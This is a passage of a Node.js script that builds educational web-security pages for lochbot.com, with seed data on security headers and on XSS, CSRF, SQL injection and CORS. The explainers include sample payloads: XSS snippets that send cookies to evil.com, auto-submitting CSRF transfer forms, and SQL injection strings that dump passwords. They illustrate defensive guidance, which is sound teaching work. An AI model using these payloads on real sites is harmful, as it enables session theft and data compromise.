#!/usr/bin/env node
// V31: Programmatic answer page generator for lochbot.com
// No npm dependencies — pure Node.js
'use strict';

const fs = require('fs');
const path = require('path');

const ANSWERS_DIR = path.join(__dirname, '..', 'answers');
const SITEMAP_PATH = path.join(__dirname, '..', 'sitemap.xml');
const TODAY = '2026-04-11';
const BASE_URL = 'https://lochbot.com';

// V30 pages — never overwrite
const PROTECTED = new Set([
  'what-is-prompt-injection.html',
  'how-to-prevent-prompt-injection.html',
  'dan-jailbreak-explained.html',
  'system-prompt-best-practices.html',
  'is-my-chatbot-secure.html',
  'owasp-llm-top-10.html',
  'how-to-write-a-secure-system-prompt.html',
  'what-is-indirect-prompt-injection.html',
]);

// ─── SEED DATA ──────────────────────────────────────────────────────────────

const SECURITY_HEADERS = [
  {
    slug: 'content-security-policy',
    title: 'Content-Security-Policy (CSP) Header Explained',
    shortTitle: 'Content-Security-Policy',
    answer: 'Content-Security-Policy (CSP) is an HTTP response header that tells browsers which sources of content are allowed to load on your page. It is the single most effective defense against Cross-Site Scripting (XSS) attacks because it prevents the browser from executing inline scripts or loading resources from unauthorized origins.',
    headerValue: "Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
    directives: [
      { name: "default-src 'self'", desc: 'Only allow resources from the same origin by default' },
      { name: "script-src 'self'", desc: 'Only allow JavaScript from the same origin — blocks inline scripts' },
      { name: "frame-ancestors 'none'", desc: 'Prevents your page from being embedded in iframes (clickjacking defense)' },
      { name: "base-uri 'self'", desc: 'Prevents attackers from changing the base URL for relative URLs' },
      { name: "form-action 'self'", desc: 'Restricts where forms can submit data to' },
    ],
    risks: 'Without CSP, attackers can inject arbitrary scripts via XSS vulnerabilities, steal session cookies, redirect users to phishing pages, or mine cryptocurrency in the background. CSP does not prevent the vulnerability itself, but it prevents the browser from executing the injected payload.',
    implementation: `# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';" always;

# Apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';"

# Express.js
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';"
  );
  next();
});`,
    reportOnly: "Use Content-Security-Policy-Report-Only first to test your policy without breaking anything. This header logs violations to a reporting endpoint without blocking content. Once you've resolved all violations, switch to the enforcing header.",
    faq: [
      { q: 'What does Content-Security-Policy do?', a: 'CSP tells the browser which sources of content (scripts, styles, images, fonts, etc.) are allowed to load. Any content from an unauthorized source is blocked, preventing XSS attacks from executing injected code.' },
      { q: 'Does CSP prevent XSS attacks?', a: 'CSP mitigates XSS by blocking execution of injected scripts. It does not fix the underlying vulnerability — you still need input validation and output encoding — but it prevents the browser from running malicious payloads even if they are injected.' },
      { q: 'What is CSP Report-Only mode?', a: 'Content-Security-Policy-Report-Only logs policy violations without blocking content. Use it to test your CSP before enforcing it. Violations are sent to the URL specified in the report-uri or report-to directive.' },
    ],
    related: ['x-frame-options', 'x-xss-protection', 'what-is-xss', 'what-is-clickjacking'],
  },
  {
    slug: 'x-frame-options',
    title: 'X-Frame-Options Header Explained',
    shortTitle: 'X-Frame-Options',
    answer: 'X-Frame-Options is an HTTP response header that controls whether your page can be embedded inside an iframe, frame, or object element. Setting it to DENY or SAMEORIGIN prevents clickjacking attacks where an attacker overlays your site with invisible iframes to trick users into clicking hidden buttons.',
    headerValue: 'X-Frame-Options: DENY',
    directives: [
      { name: 'DENY', desc: 'The page cannot be displayed in a frame regardless of the site attempting to do so' },
      { name: 'SAMEORIGIN', desc: 'The page can only be displayed in a frame on the same origin as the page itself' },
    ],
    risks: 'Without X-Frame-Options, attackers can embed your login page in an invisible iframe, overlay it with a decoy UI, and trick users into entering credentials or clicking buttons they cannot see. This is called clickjacking or UI redressing.',
    implementation: `# Nginx
add_header X-Frame-Options "DENY" always;

# Apache
Header always set X-Frame-Options "DENY"

# Express.js
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});`,
    reportOnly: 'X-Frame-Options does not have a report-only mode. Use CSP frame-ancestors directive instead, which supersedes X-Frame-Options and supports report-only testing.',
    faq: [
      { q: 'What does X-Frame-Options do?', a: 'X-Frame-Options prevents your web page from being embedded in an iframe on another site. This blocks clickjacking attacks where an attacker tricks users into interacting with your site without realizing it.' },
      { q: 'Should I use DENY or SAMEORIGIN?', a: "Use DENY unless you need to embed your own pages in iframes on your own domain. DENY blocks all framing. SAMEORIGIN allows framing only from pages on the same origin." },
      { q: 'Is X-Frame-Options still needed with CSP?', a: "CSP's frame-ancestors directive supersedes X-Frame-Options and is more flexible. However, X-Frame-Options is still recommended for backward compatibility with older browsers that don't support CSP." },
    ],
    related: ['content-security-policy', 'what-is-clickjacking', 'strict-transport-security'],
  },
  {
    slug: 'strict-transport-security',
    title: 'Strict-Transport-Security (HSTS) Header Explained',
    shortTitle: 'Strict-Transport-Security',
    answer: 'Strict-Transport-Security (HSTS) is an HTTP response header that tells browsers to only connect to your site over HTTPS, never HTTP. Once a browser receives this header, it will automatically upgrade all future HTTP requests to HTTPS for the specified duration, preventing SSL stripping attacks and protocol downgrade attacks.',
    headerValue: 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
    directives: [
      { name: 'max-age=31536000', desc: 'Browser remembers to use HTTPS for 1 year (in seconds)' },
      { name: 'includeSubDomains', desc: 'Applies HSTS to all subdomains as well' },
      { name: 'preload', desc: 'Allows submission to the HSTS preload list built into browsers' },
    ],
    risks: 'Without HSTS, an attacker on the same network (coffee shop Wi-Fi, compromised router) can intercept the initial HTTP request before the redirect to HTTPS. This is called SSL stripping — the attacker downgrades the connection to plain HTTP, intercepting all traffic including login credentials and session cookies.',
    implementation: `# Nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# Apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

# Express.js
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  next();
});`,
    reportOnly: 'HSTS does not have a report-only mode. Start with a short max-age (e.g., 300 seconds = 5 minutes) to test, then gradually increase to 31536000 (1 year) once confirmed working.',
    faq: [
      { q: 'What does HSTS do?', a: 'HSTS forces browsers to connect to your site exclusively over HTTPS. After receiving the header, the browser converts all HTTP requests to HTTPS automatically, preventing man-in-the-middle attacks from downgrading the connection.' },
      { q: 'What is HSTS preloading?', a: 'HSTS preloading means your domain is hardcoded into the browser itself (Chrome, Firefox, Safari) as HTTPS-only. This protects the very first visit, before the browser has ever seen your HSTS header. Submit at hstspreload.org.' },
      { q: 'Can I undo HSTS?', a: 'Set max-age=0 to tell browsers to stop enforcing HSTS. However, if your domain is on the preload list, removal takes months because it requires a browser update cycle.' },
    ],
    related: ['content-security-policy', 'x-content-type-options', 'referrer-policy'],
  },
  {
    slug: 'x-content-type-options',
    title: 'X-Content-Type-Options Header Explained',
    shortTitle: 'X-Content-Type-Options',
    answer: 'X-Content-Type-Options: nosniff is an HTTP response header that prevents browsers from MIME-type sniffing. Without it, browsers may interpret a file as a different content type than declared, allowing attackers to disguise executable scripts as images or other harmless file types.',
    headerValue: 'X-Content-Type-Options: nosniff',
    directives: [
      { name: 'nosniff', desc: 'The only valid value — tells the browser to strictly follow the declared Content-Type and never guess' },
    ],
    risks: 'Without nosniff, an attacker can upload a file with a .jpg extension but containing JavaScript. If the server serves it with the wrong Content-Type or without one, the browser might sniff the actual content and execute it as JavaScript, bypassing XSS protections.',
    implementation: `# Nginx
add_header X-Content-Type-Options "nosniff" always;

# Apache
Header always set X-Content-Type-Options "nosniff"

# Express.js
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});`,
    reportOnly: 'X-Content-Type-Options has no report-only mode. It is safe to deploy immediately since it only enforces correct MIME type handling.',
    faq: [
      { q: 'What does X-Content-Type-Options: nosniff do?', a: 'It tells the browser to trust the Content-Type header sent by the server and never try to guess the file type by inspecting the content. This prevents MIME confusion attacks where scripts are disguised as images or other safe file types.' },
      { q: 'Is nosniff the only valid value?', a: 'Yes. The only valid value for X-Content-Type-Options is nosniff. Any other value is ignored by the browser.' },
      { q: 'Does X-Content-Type-Options affect performance?', a: 'No. It has zero performance impact. The browser simply skips the MIME-sniffing step and trusts the declared Content-Type header, which is actually slightly faster.' },
    ],
    related: ['content-security-policy', 'x-xss-protection', 'strict-transport-security'],
  },
  {
    slug: 'referrer-policy',
    title: 'Referrer-Policy Header Explained',
    shortTitle: 'Referrer-Policy',
    answer: 'Referrer-Policy is an HTTP response header that controls how much referrer information is sent when a user navigates away from your site. Setting it to strict-origin-when-cross-origin or no-referrer prevents sensitive URL paths, query parameters, and internal page structures from leaking to third-party sites.',
    headerValue: 'Referrer-Policy: strict-origin-when-cross-origin',
    directives: [
      { name: 'no-referrer', desc: 'Never send any referrer information' },
      { name: 'strict-origin-when-cross-origin', desc: 'Send full URL for same-origin, only origin for cross-origin HTTPS, nothing for HTTPS→HTTP' },
      { name: 'same-origin', desc: 'Only send referrer for same-origin requests, nothing for cross-origin' },
      { name: 'origin', desc: 'Only send the origin (scheme+host+port), never the path or query string' },
    ],
    risks: 'Without Referrer-Policy, the full URL (including path, query parameters, and fragments) is sent as the Referer header when users click outbound links. This can leak sensitive data like session tokens in URLs, internal admin paths, search queries, or user-specific page URLs to third-party analytics, ads, or linked sites.',
    implementation: `# Nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Apache
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# Express.js
app.use((req, res, next) => {
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});`,
    reportOnly: 'Referrer-Policy has no report-only mode. To test, check your outbound link behavior using browser DevTools Network tab — inspect the Referer header on cross-origin requests.',
    faq: [
      { q: 'What does Referrer-Policy control?', a: 'It controls how much URL information the browser sends in the Referer header when navigating away from your page. This affects outbound link clicks, embedded resources, and API requests.' },
      { q: 'What is the recommended Referrer-Policy value?', a: 'strict-origin-when-cross-origin is recommended for most sites. It provides full referrer data for same-origin navigation (useful for analytics) while limiting cross-origin referrers to just the origin domain.' },
      { q: 'Does Referrer-Policy affect SEO?', a: 'Using no-referrer prevents destination sites from seeing your URL in their analytics, but this does not affect search engine ranking. Google and Bing receive referrer data through Search Console, not via the HTTP Referer header.' },
    ],
    related: ['content-security-policy', 'permissions-policy', 'strict-transport-security'],
  },
  {
    slug: 'permissions-policy',
    title: 'Permissions-Policy Header Explained',
    shortTitle: 'Permissions-Policy',
    answer: 'Permissions-Policy (formerly Feature-Policy) is an HTTP response header that controls which browser features and APIs can be used on your page. It allows you to disable access to the camera, microphone, geolocation, and other sensitive APIs, reducing the attack surface if an attacker achieves code execution on your page.',
    headerValue: 'Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=()',
    directives: [
      { name: 'camera=()', desc: 'Disables camera access for the page and all embedded iframes' },
      { name: 'microphone=()', desc: 'Disables microphone access' },
      { name: 'geolocation=()', desc: 'Disables geolocation API' },
      { name: 'payment=()', desc: 'Disables Payment Request API' },
      { name: 'usb=()', desc: 'Disables WebUSB API' },
    ],
    risks: 'Without Permissions-Policy, any JavaScript running on your page (including injected scripts or compromised third-party libraries) can access the camera, microphone, geolocation, and other sensitive APIs. An XSS attack could silently activate the webcam or track the user\'s location.',
    implementation: `# Nginx
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=()" always;

# Apache
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=()"

# Express.js
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=()');
  next();
});`,
    reportOnly: 'Permissions-Policy does not have a report-only mode. However, it is safe to deploy restrictively because most web apps do not use camera, microphone, or geolocation APIs. Only add exceptions for features you actually use.',
    faq: [
      { q: 'What does Permissions-Policy do?', a: 'Permissions-Policy restricts which browser APIs (camera, microphone, geolocation, etc.) can be used by your page and its embedded iframes. Disabling unused APIs reduces the damage an attacker can do if they achieve code execution.' },
      { q: 'What happened to Feature-Policy?', a: 'Feature-Policy was renamed to Permissions-Policy. The new header uses a different syntax: camera=() instead of camera \'none\'. Most modern browsers support the new Permissions-Policy header.' },
      { q: 'Does Permissions-Policy affect third-party iframes?', a: 'Yes. When you set camera=(), neither your page nor any embedded iframe can access the camera, even if the iframe is from a different origin. To allow a specific origin, use camera=(self "https://trusted.example.com").' },
    ],
    related: ['content-security-policy', 'referrer-policy', 'cross-origin-opener-policy'],
  },
  {
    slug: 'cross-origin-opener-policy',
    title: 'Cross-Origin-Opener-Policy (COOP) Header Explained',
    shortTitle: 'Cross-Origin-Opener-Policy',
    answer: 'Cross-Origin-Opener-Policy (COOP) is an HTTP response header that isolates your page from cross-origin windows. Setting it to same-origin prevents other websites from gaining a reference to your window object via window.open(), blocking Spectre-type side-channel attacks and cross-origin information leaks.',
    headerValue: 'Cross-Origin-Opener-Policy: same-origin',
    directives: [
      { name: 'same-origin', desc: 'Fully isolates the page — cross-origin openers lose their reference' },
      { name: 'same-origin-allow-popups', desc: 'Isolates the page but allows popups it opens to retain a reference back' },
      { name: 'unsafe-none', desc: 'Default — no isolation, other origins can reference your window' },
    ],
    risks: 'Without COOP, a malicious page that opens yours via window.open() retains a reference to your window object. Combined with Spectre-type attacks, this can leak sensitive data from your page\'s memory, including authentication tokens and user data.',
    implementation: `# Nginx
add_header Cross-Origin-Opener-Policy "same-origin" always;

# Apache
Header always set Cross-Origin-Opener-Policy "same-origin"

# Express.js
app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  next();
});`,
    reportOnly: 'Use Cross-Origin-Opener-Policy-Report-Only to test COOP before enforcing. Violations are reported to the endpoint specified in the Reporting-Endpoints header.',
    faq: [
      { q: 'What does COOP do?', a: 'COOP isolates your browsing context from cross-origin documents. When set to same-origin, other origins that open your page via window.open() will get a null reference instead of a handle to your window, preventing cross-origin information leaks.' },
      { q: 'Why do I need COOP for SharedArrayBuffer?', a: 'Browsers require both COOP: same-origin and COEP: require-corp headers to enable cross-origin isolation, which is required for SharedArrayBuffer and high-resolution timers. This prevents Spectre-type timing attacks.' },
      { q: 'Will COOP break my payment flows?', a: 'If you use popup-based OAuth or payment flows, COOP: same-origin will break them because the popup loses its reference to your window. Use same-origin-allow-popups instead to maintain popup communication.' },
    ],
    related: ['cross-origin-resource-policy', 'content-security-policy', 'permissions-policy'],
  },
  {
    slug: 'cross-origin-resource-policy',
    title: 'Cross-Origin-Resource-Policy (CORP) Header Explained',
    shortTitle: 'Cross-Origin-Resource-Policy',
    answer: 'Cross-Origin-Resource-Policy (CORP) is an HTTP response header that prevents other websites from loading your resources (images, scripts, fonts) in their pages. Setting it to same-origin or same-site blocks unauthorized hotlinking and prevents your resources from being used in Spectre-type side-channel attacks.',
    headerValue: 'Cross-Origin-Resource-Policy: same-origin',
    directives: [
      { name: 'same-origin', desc: 'Only pages from the same origin can load this resource' },
      { name: 'same-site', desc: 'Pages from the same site (same eTLD+1) can load this resource' },
      { name: 'cross-origin', desc: 'Any origin can load this resource (equivalent to no protection)' },
    ],
    risks: 'Without CORP, any website can embed your images, scripts, and API responses. This enables hotlinking (bandwidth theft), data exfiltration if your resources contain sensitive data, and Spectre-type attacks that can read the content of cross-origin resources loaded into the attacker\'s process.',
    implementation: `# Nginx — for API/private resources
add_header Cross-Origin-Resource-Policy "same-origin" always;

# Nginx — for public CDN assets
add_header Cross-Origin-Resource-Policy "cross-origin" always;

# Express.js
app.use('/api', (req, res, next) => {
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  next();
});`,
    reportOnly: 'CORP does not have a report-only mode. Apply same-origin to private resources and API endpoints. Use cross-origin for public assets that legitimately need to be embedded by third parties (CDN assets, public images).',
    faq: [
      { q: 'What does CORP do?', a: 'CORP controls which origins can load a resource. When set to same-origin, only pages from the same origin can embed the resource. This prevents hotlinking, unauthorized data access, and Spectre-type attacks against your resources.' },
      { q: 'What is the difference between CORP and CORS?', a: 'CORS (Cross-Origin Resource Sharing) allows cross-origin requests to your API. CORP blocks cross-origin embedding of your resources. They solve different problems: CORS is for APIs, CORP is for static resources and preventing Spectre attacks.' },
      { q: 'When should I use cross-origin instead of same-origin?', a: 'Use cross-origin for resources that are intentionally public — CDN-hosted scripts, public images, web fonts served to third parties. Use same-origin for everything private — API responses, user data, internal assets.' },
    ],
    related: ['cross-origin-opener-policy', 'content-security-policy', 'strict-transport-security'],
  },
  {
    slug: 'x-xss-protection',
    title: 'X-XSS-Protection Header Explained',
    shortTitle: 'X-XSS-Protection',
    answer: 'X-XSS-Protection is a legacy HTTP response header that controlled the browser\'s built-in XSS filter. Modern browsers have removed this filter entirely. The recommended setting is now X-XSS-Protection: 0 to explicitly disable it, because the filter itself introduced vulnerabilities in some cases. Use Content-Security-Policy instead for XSS protection.',
    headerValue: 'X-XSS-Protection: 0',
    directives: [
      { name: '0', desc: 'Disable the XSS filter (recommended — the filter is removed in modern browsers)' },
      { name: '1', desc: 'Enable the XSS filter (legacy, not recommended)' },
      { name: '1; mode=block', desc: 'Enable and block the entire page on detection (legacy, not recommended)' },
    ],
    risks: 'The X-XSS-Protection filter was itself vulnerable to exploitation. Attackers could abuse the filter to selectively disable legitimate scripts on a page, creating new vulnerabilities. Chrome removed the XSS Auditor in Chrome 78 (2019), and no modern browser supports it. Use CSP instead.',
    implementation: `# Nginx — disable legacy filter
add_header X-XSS-Protection "0" always;

# Apache
Header always set X-XSS-Protection "0"

# Express.js
app.use((req, res, next) => {
  res.setHeader('X-XSS-Protection', '0');
  next();
});

// Instead, use CSP for XSS protection:
// Content-Security-Policy: script-src 'self'`,
    reportOnly: 'X-XSS-Protection has no report-only mode. More importantly, it should be set to 0 (disabled) and replaced with Content-Security-Policy for actual XSS protection.',
    faq: [
      { q: 'Should I still set X-XSS-Protection?', a: 'Yes, set it to 0. While modern browsers ignore it, explicitly disabling the filter prevents issues in legacy browsers where the XSS auditor could be exploited. Combined with a strong CSP, you get proper XSS protection.' },
      { q: 'Why was X-XSS-Protection removed?', a: 'Browser vendors removed the XSS Auditor because it was unreliable (false positives blocked legitimate content), bypassable (attackers found ways around it), and itself exploitable (attackers could weaponize the filter to disable scripts). CSP is a superior replacement.' },
      { q: 'What should I use instead of X-XSS-Protection?', a: "Content-Security-Policy with script-src 'self' provides real XSS protection. CSP blocks all inline scripts and scripts from unauthorized origins, which is far more effective than the browser's pattern-matching XSS filter ever was." },
    ],
    related: ['content-security-policy', 'x-content-type-options', 'what-is-xss'],
  },
  {
    slug: 'cache-control-security',
    title: 'Cache-Control for Security — Preventing Sensitive Data Leaks',
    shortTitle: 'Cache-Control Security',
    answer: 'Cache-Control is an HTTP header that controls how browsers and proxies cache responses. For security, sensitive pages (login, account, admin, API responses with personal data) must use Cache-Control: no-store to prevent cached copies from being accessed by other users on shared computers, proxy servers, or browser back/forward navigation.',
    headerValue: 'Cache-Control: no-store, no-cache, must-revalidate, private',
    directives: [
      { name: 'no-store', desc: 'Never store any copy of the response — the strongest cache prevention directive' },
      { name: 'no-cache', desc: 'Cache may store but must revalidate with the server before every use' },
      { name: 'private', desc: 'Only the browser may cache, not shared proxies or CDNs' },
      { name: 'must-revalidate', desc: 'Stale cached copies must not be used without revalidation' },
    ],
    risks: 'Without proper Cache-Control, sensitive pages can be stored in browser cache, CDN edge caches, or corporate proxy servers. A subsequent user on a shared computer can press the Back button to view the previous user\'s account page. CDN cache poisoning can serve one user\'s data to another.',
    implementation: `# Nginx — for sensitive pages
location /account {
    add_header Cache-Control "no-store, no-cache, must-revalidate, private" always;
    add_header Pragma "no-cache";
}

# Express.js — for API responses with user data
app.use('/api/user', (req, res, next) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma', 'no-cache');  // HTTP/1.0 backward compat
  next();
});

# Django middleware
@cache_control(no_store=True, no_cache=True, must_revalidate=True, private=True)
def account_view(request):
    ...`,
    reportOnly: 'Cache-Control has no report-only mode. Test by inspecting response headers in DevTools and checking that sensitive pages return no-store. Also verify CDN behavior separately — some CDNs override Cache-Control headers.',
    faq: [
      { q: 'When should I use no-store?', a: 'Use no-store for any page or API response containing personal data, authentication tokens, financial information, or admin content. This includes login pages, account dashboards, API endpoints returning user-specific data, and admin panels.' },
      { q: 'What is the difference between no-store and no-cache?', a: 'no-store means never save a copy anywhere. no-cache means you may save a copy but must check with the server before using it. For security-sensitive content, use no-store — it is the only directive that guarantees no cached copy exists.' },
      { q: 'Does Cache-Control affect CDN caching?', a: 'Cache-Control: private tells CDNs not to cache the response, but some CDNs ignore this. Use no-store for maximum safety, and verify your CDN configuration separately. Cloudflare, for example, respects no-store but may cache responses with only private set.' },
    ],
    related: ['strict-transport-security', 'referrer-policy', 'content-security-policy'],
  },
];

const WEB_SECURITY = [
  {
    slug: 'what-is-xss',
    title: 'What Is XSS (Cross-Site Scripting)?',
    answer: 'Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious JavaScript into pages viewed by other users. The injected script runs in the victim\'s browser with full access to their session, cookies, and the page DOM, enabling session hijacking, data theft, and account takeover.',
    types: [
      { name: 'Reflected XSS', desc: 'Malicious script is embedded in a URL or form submission and reflected back in the server\'s response. The attack requires the victim to click a crafted link.', example: 'https://example.com/search?q=<script>document.location="https://evil.com/?c="+document.cookie</script>' },
      { name: 'Stored XSS', desc: 'Malicious script is permanently stored on the server (in a database, comment field, or user profile) and served to every user who views the affected page.', example: 'An attacker posts a comment containing <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>' },
      { name: 'DOM-based XSS', desc: 'The vulnerability exists in client-side JavaScript that processes untrusted data (URL fragments, postMessage data) and writes it to the DOM without sanitization.', example: 'document.getElementById("output").innerHTML = location.hash.substring(1)' },
    ],
    prevention: `// 1. Output encoding — escape HTML entities
function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

// 2. Use textContent instead of innerHTML
element.textContent = userInput;  // Safe
element.innerHTML = userInput;    // DANGEROUS

// 3. Content-Security-Policy header
// Content-Security-Policy: script-src 'self'

// 4. Framework auto-escaping (React, Vue, Angular)
// React: {userInput} is auto-escaped
// Vue: {{ userInput }} is auto-escaped
// Angular: {{ userInput }} is auto-escaped`,
    impact: 'Session hijacking via cookie theft, account takeover, keylogging, phishing via page defacement, cryptocurrency mining, worm propagation (Samy worm infected 1M MySpace profiles in 20 hours).',
    faq: [
      { q: 'What is XSS?', a: 'XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. The script executes in the victim\'s browser with their session privileges, enabling cookie theft, session hijacking, and account takeover.' },
      { q: 'How do I prevent XSS?', a: 'Use output encoding (escape HTML entities), Content-Security-Policy headers, framework auto-escaping (React, Vue, Angular), and avoid innerHTML. Validate and sanitize all user input on both client and server side.' },
      { q: 'What is the difference between reflected and stored XSS?', a: 'Reflected XSS requires the victim to click a malicious link — the payload is in the URL. Stored XSS is permanently saved on the server and attacks every user who views the page, making it more dangerous.' },
    ],
    related: ['content-security-policy', 'x-xss-protection', 'what-is-csrf', 'how-to-prevent-prompt-injection'],
  },
  {
    slug: 'what-is-csrf',
    title: 'What Is CSRF (Cross-Site Request Forgery)?',
    answer: 'Cross-Site Request Forgery (CSRF) is an attack that tricks a logged-in user\'s browser into sending an unwanted request to a web application where they are authenticated. Because the browser automatically includes session cookies with every request, the server cannot distinguish between a legitimate request and a forged one.',
    types: [
      { name: 'GET-based CSRF', desc: 'Exploits state-changing GET requests via img tags or links.', example: '<img src="https://bank.com/transfer?to=attacker&amount=10000">' },
      { name: 'POST-based CSRF', desc: 'Uses a hidden auto-submitting form to send POST requests.', example: '<form action="https://bank.com/transfer" method="POST"><input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="10000"></form><script>document.forms[0].submit()</script>' },
    ],
    prevention: `// 1. CSRF tokens — unique per session, validated on server
<form method="POST">
  <input type="hidden" name="_csrf" value="random-token-here">
</form>

// 2. SameSite cookies — prevent cross-origin cookie sending
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// 3. Check Origin/Referer headers
if (req.headers.origin !== 'https://yoursite.com') {
  return res.status(403).json({ error: 'CSRF detected' });
}

// 4. Double-submit cookie pattern
// Set a random value in both a cookie and a form field
// Server verifies they match`,
    impact: 'Unauthorized fund transfers, email/password changes, privilege escalation, data deletion. In 2008, a CSRF vulnerability in a major router allowed attackers to change DNS settings, redirecting all traffic through malicious servers.',
    faq: [
      { q: 'What is CSRF?', a: 'CSRF tricks a logged-in user\'s browser into making unwanted requests to a site where they are authenticated. The browser automatically sends cookies, so the server processes the request as if the user initiated it.' },
      { q: 'How does SameSite cookie attribute prevent CSRF?', a: 'SameSite=Strict prevents the browser from sending cookies on any cross-origin request. SameSite=Lax allows cookies on top-level GET navigations but blocks them on POST requests and embedded resources from other sites.' },
      { q: 'Do I still need CSRF tokens with SameSite cookies?', a: 'SameSite=Lax is the default in modern browsers and prevents most CSRF. However, CSRF tokens provide defense in depth for older browsers and edge cases. Use both for critical applications.' },
    ],
    related: ['what-is-xss', 'what-is-clickjacking', 'content-security-policy', 'referrer-policy'],
  },
  {
    slug: 'what-is-sql-injection',
    title: 'What Is SQL Injection?',
    answer: 'SQL injection is a vulnerability where an attacker inserts malicious SQL code into application queries through user input fields. If the application builds SQL queries by concatenating user input directly, the attacker can read, modify, or delete database data, bypass authentication, and in some cases execute operating system commands.',
    types: [
      { name: 'Classic SQL Injection', desc: 'Directly manipulates the query by terminating the string and adding new SQL commands.', example: "Username: admin' OR '1'='1' --" },
      { name: 'Blind SQL Injection', desc: 'No visible error output — attacker infers data by observing response differences (boolean-based) or timing delays (time-based).', example: "id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)" },
      { name: 'Union-based SQL Injection', desc: 'Uses UNION SELECT to combine results from other tables into the response.', example: "id=1 UNION SELECT username, password FROM users --" },
    ],
    prevention: `# 1. Parameterized queries (prepared statements) — THE fix
# Python (psycopg2)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Node.js (pg)
client.query('SELECT * FROM users WHERE id = $1', [userId])

# Java (JDBC)
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);

# 2. ORM — inherently parameterized
# Django
User.objects.filter(id=user_id)
# SQLAlchemy
session.query(User).filter(User.id == user_id)

# 3. NEVER do this:
# query = "SELECT * FROM users WHERE id = " + user_input  // VULNERABLE`,
    impact: 'Complete database compromise, authentication bypass, data exfiltration, data deletion, privilege escalation to database admin, and potentially remote code execution via xp_cmdshell (SQL Server) or LOAD_FILE (MySQL).',
    faq: [
      { q: 'What is SQL injection?', a: 'SQL injection is when an attacker manipulates database queries by inserting malicious SQL code through user input. If the application concatenates user input directly into SQL strings, the attacker can read, modify, or delete any data in the database.' },
      { q: 'How do I prevent SQL injection?', a: 'Use parameterized queries (prepared statements) for all database interactions. Never concatenate user input into SQL strings. ORMs like Django ORM, SQLAlchemy, and Sequelize handle parameterization automatically.' },
      { q: 'Is SQL injection still common in 2026?', a: 'Yes. SQL injection has been in the OWASP Top 10 since its inception and remains one of the most exploited vulnerabilities. While frameworks make prevention easier, legacy code and raw SQL queries in new code continue to introduce the vulnerability.' },
    ],
    related: ['what-is-xss', 'what-is-ssrf', 'owasp-llm-top-10', 'what-is-directory-traversal'],
  },
  {
    slug: 'what-is-cors',
    title: 'What Is CORS (Cross-Origin Resource Sharing)?',
    answer: 'CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls which websites can make requests to your server. By default, browsers block cross-origin requests (Same-Origin Policy). CORS headers let you selectively allow specific origins to access your API, while keeping everyone else blocked.',
    types: [
      { name: 'Simple Requests', desc: 'GET, HEAD, or POST with standard headers — sent directly with an Origin header. The browser checks the response for Access-Control-Allow-Origin.' },
      { name: 'Preflight Requests', desc: 'For non-simple requests (PUT, DELETE, custom headers), the browser sends an OPTIONS preflight first to check if the server allows the actual request.' },
      { name: 'Credentialed Requests', desc: 'Requests with cookies or auth headers require Access-Control-Allow-Credentials: true and a specific origin (not wildcard *).' },
    ],
    prevention: `# Secure CORS configuration — Express.js
const allowedOrigins = ['https://myapp.com', 'https://admin.myapp.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

# DANGEROUS — never do this in production:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# (These two together are actually blocked by browsers)`,
    impact: 'Misconfigured CORS (especially reflecting any Origin with credentials) allows any website to make authenticated requests to your API, stealing user data, performing unauthorized actions, and exfiltrating sensitive information.',
    faq: [
      { q: 'What does CORS do?', a: 'CORS lets servers specify which other websites can make requests to them. Without CORS headers, browsers block cross-origin requests by default (Same-Origin Policy). CORS selectively relaxes this restriction for trusted origins.' },
